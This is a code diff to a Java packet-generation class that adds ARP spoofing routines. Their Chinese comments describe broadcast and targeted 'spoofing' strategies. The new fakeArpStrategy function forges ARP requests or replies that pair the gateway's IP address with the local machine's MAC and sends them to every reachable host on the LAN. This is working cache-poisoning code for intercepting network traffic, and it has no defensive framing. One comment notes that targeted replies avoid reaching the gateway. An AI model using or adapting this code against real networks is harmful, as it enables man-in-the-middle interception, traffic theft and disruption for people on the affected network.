@@ -1,15 +1,16 @@
 package org.jasic.qzoner.util;
 import jpcap.packet.ARPPacket;
 import jpcap.packet.EthernetPacket;
+import org.jasic.qzoner.common.GlobalCaches;
 import org.jasic.qzoner.common.Globalvariables;
 import org.jasic.qzoner.core.entity.IpMacPair;
 import org.jasic.utils.SystemUtil;
 
 import java.net.InetAddress;
 import java.net.UnknownHostException;
-import java.util.ArrayList;
-import java.util.List;
+import java.util.*;
 
+import static org.jasic.utils.StringUtils.fieldval2Map;
 import static org.jasic.utils.SystemUtil.macStrToByte;
 
 /**
@@ -145,9 +146,90 @@ public class PacketGener {
                 arpPacket = PacketGener.getArpRepPacket(srcIpMac, pair, false);
             }
             arpPacket.datalink = PacketGener.genEthpacket(macStrToByte(srcIpMac.getMac()), macStrToByte(pair.getMac()), EthernetPacket.ETHERTYPE_ARP);
+//            arpPacket.datalink = PacketGener.genEthpacket(macStrToByte("00-00-00-00-00-00"), macStrToByte(pair.getMac()), EthernetPacket.ETHERTYPE_ARP);
             if (arpPacket != null) {
                 arpPacketList.add(arpPacket);
             }
+        }
+        return arpPacketList;
+    }
+
+
+    /**
+     * 欺骗的广播策略请求
+     */
+    public static List<ARPPacket> brocasStrategy(IpMacPair gateWay, IpMacPair localIpMacPair) throws Exception {
+//        List<ARPPacket> arpPackets = PacketGener.genBrocastArp(this.localIpMacPair, true);
+        List<ARPPacket> arpPackets = PacketGener.genBrocastArp(new IpMacPair(gateWay.getIp(), localIpMacPair.getMac()), true);
+        return arpPackets;
+    }
+
+    /**
+     * 指定欺骗请求
+     */
+    public static List<ARPPacket> fakeReqStrategy(IpMacPair gateWay, IpMacPair localIpMacPair) throws Exception {
+        return fakeArpStrategy(gateWay, localIpMacPair, true);
+    }
+
+    /**
+     * 指定欺骗响应
+     * 因为不使用广播欺骗能减少网络阻塞，和不发送给网关。
+     */
+    public static List<ARPPacket> fakeRepStrategy(IpMacPair gateWay, IpMacPair localIpMacPair) throws Exception {
+        return fakeArpStrategy(gateWay, localIpMacPair, false);
+    }
+
+    /**
+     * 随机欺骗响应或请求
+     * @param gateWay
+     * @param localIpMacPair
+     * @return
+     * @throws Exception
+     */
+    public static List<ARPPacket> fakeRandomArpStrategy(IpMacPair gateWay, IpMacPair localIpMacPair) throws Exception {
+        return fakeArpStrategy(gateWay, localIpMacPair, null);
+    }
+
+
+    /**
+     * 伪造arp实体 true：arp请求实体 false:arp响应实体,null则随机生成响应或请求
+     *
+     * @param gateWay
+     * @param localIpMacPair
+     * @param isArpRequest
+     * @return
+     * @throws Exception
+     */
+    private static List<ARPPacket> fakeArpStrategy(IpMacPair gateWay, IpMacPair localIpMacPair, Boolean isArpRequest) throws Exception {
+        List<ARPPacket> arpPacketList = new ArrayList<ARPPacket>();
+        Map<String, IpMacPair> availIpMacs = new HashMap<String, IpMacPair>(GlobalCaches.IP_MAC_LAN_CONNECTIVITY_CACHE);
+
+        if (gateWay != null) {
+            availIpMacs.remove(gateWay.getIp()); // 移除网关
+        }
+        if (gateWay == null || availIpMacs.size() == 0) {
+            throw new RuntimeException("GateWay[" + fieldval2Map(gateWay) + "]" + ",from cache has none connectivity machine ");
+        }
+
+        // 伪造网关ip-mac对
+        IpMacPair fakeIpMac = new IpMacPair(gateWay.getIp(), localIpMacPair.getMac());
+        Random random = new Random();
+        for (IpMacPair ipMacPair : availIpMacs.values()) {
+            if (ipMacPair.getMac().equals(localIpMacPair.getMac())) continue;// 排除本机
+
+            ARPPacket packet = null;
+            if (null == isArpRequest) {
+                if (random.nextBoolean()) {
+                    packet = PacketGener.getArpReqPacket(fakeIpMac, ipMacPair, true);
+                } else {
+                    packet = PacketGener.getArpRepPacket(fakeIpMac, ipMacPair, true);
+                }
+            } else if (isArpRequest) {
+                packet = PacketGener.getArpReqPacket(fakeIpMac, ipMacPair, true);
+            } else {
+                packet = PacketGener.getArpRepPacket(fakeIpMac, ipMacPair, true);
+            }
+            arpPacketList.add(packet);
         }
         return arpPacketList;
     }
